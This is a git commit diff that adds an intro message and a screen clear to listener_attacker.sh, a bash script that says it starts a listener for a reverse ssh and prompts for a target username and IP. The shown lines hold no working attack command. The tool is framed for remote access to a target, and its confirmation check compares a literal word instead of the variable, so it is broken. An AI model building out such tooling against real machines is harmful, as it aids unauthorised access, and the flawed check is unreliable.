642686b7965fdc68f3673c49a739a06e97625966
I-AtA-I <vitsedl@seznam.cz>
2025-12-03 12:23:01 +0100

    Enhance listener_attacker.sh with user input prompts
    Added user prompts for target username and IP address.

--- listener_attacker.sh
+++ listener_attacker.sh
@@ -1,10 +1,12 @@
 #!/bin/bash
+echo "This program will start a listener for a reverse ssh..."
 
 while true; do
   echo "Input target username: "
   read targetusername
   echo "Input target IP (without port): "
   read targetIP
+  clear
   echo "You inputed" $targetusername "as target username and " $targetIP "as target IP, correct? y/n :"
   read correction
   if [ correction = "y" ]; then
